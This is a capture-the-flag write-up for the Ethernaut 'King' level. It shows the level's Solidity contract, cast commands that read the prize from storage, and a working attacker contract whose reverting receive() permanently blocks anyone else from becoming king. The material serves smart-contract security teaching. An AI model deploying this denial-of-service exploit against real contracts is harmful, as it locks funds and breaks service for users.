# Ethernaut - King - Solution

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

## Solution

The goal of this level is to become the king forever.

First, we can inspect how much funds we have to send to the contract to become the new king:

```bash
cast storage <your level instance address> 1 --rpc-url $SEP_RPC_URL
# Result: 0x00000000000000000000000000000000000000000000000000038d7ea4c68000

cast to-dec 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
# Result: 1000000000000000
```

This tells us that the prize is 1 Finney.

Second, we see that `receive()` sends funds to the current king before assigning the new king.
This means we can solve this level by deploying an attacker contract that contains

1. a function that allows it to become the new king and
2. a `receive()` function that always reverts.

In other words, we can use Remix to deploy the following attacker contract and subsequently call `becomeKing()` specifying a value of at least 1 Finney.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address public immutable LEVEL_INSTANCE;

    constructor(address levelInstance) {
        LEVEL_INSTANCE = levelInstance;
    }

    function becomeKing() external payable {
        (bool success, ) = payable(LEVEL_INSTANCE).call{value: msg.value}("");
        require(success, "Transfer failed");

    }

    receive() external payable {
        revert("Long live Marco XLII");
    }
}
```
